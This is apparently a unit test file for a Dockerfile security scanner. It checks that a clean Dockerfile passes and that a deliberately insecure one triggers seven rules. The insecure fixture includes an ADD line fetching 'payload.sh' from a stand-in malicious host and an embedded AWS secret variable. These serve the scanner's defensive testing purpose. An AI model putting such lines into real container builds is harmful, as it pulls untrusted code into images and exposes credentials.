"""Unit tests for Container Security Scanner."""
from scanner.container_security import DockerfileScanner


def test_dockerfile_clean() -> None:
    scanner = DockerfileScanner()
    clean_dockerfile = (
        "FROM python:3.11-slim-bookworm\n"
        "RUN apt-get update && apt-get install -y --no-install-recommends curl && rm -rf /var/lib/apt/lists/*\n"
        "RUN useradd -m appuser\n"
        "WORKDIR /app\n"
        "COPY . .\n"
        "USER appuser\n"
        "HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:8000/health || exit 1\n"
        "EXPOSE 8000\n"
        "CMD [\"python\", \"main.py\"]\n"
    )
    findings = scanner.scan_content(clean_dockerfile)
    assert len(findings) == 0

def test_dockerfile_vulnerabilities_detected() -> None:
    scanner = DockerfileScanner()
    bad_dockerfile = (
        "FROM python:latest\n"
        "ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\n"
        "EXPOSE 22\n"
        "EXPOSE 3389\n"
        "ADD http://malicious.com/payload.sh /app/\n"
        "RUN apt-get update && apt-get install -y vim\n"
        "USER root\n"
        "CMD [\"bash\"]\n"
    )
    findings = scanner.scan_content(bad_dockerfile)
    rule_ids = {f.rule_id for f in findings}

    assert "CONT-001" in rule_ids  # root execution
    assert "CONT-002" in rule_ids  # :latest tag
    assert "CONT-003" in rule_ids  # exposed ports 22, 3389
    assert "CONT-004" in rule_ids  # embedded secrets
    assert "CONT-005" in rule_ids  # ADD command
    assert "CONT-006" in rule_ids  # apt-get cache not cleaned
    assert "CONT-007" in rule_ids  # missing healthcheck

    # Check conversion to Finding model
    model_finding = findings[0].to_finding("Dockerfile")
    assert model_finding.category == "container_security"
    assert model_finding.severity in ("critical", "high", "medium", "low")
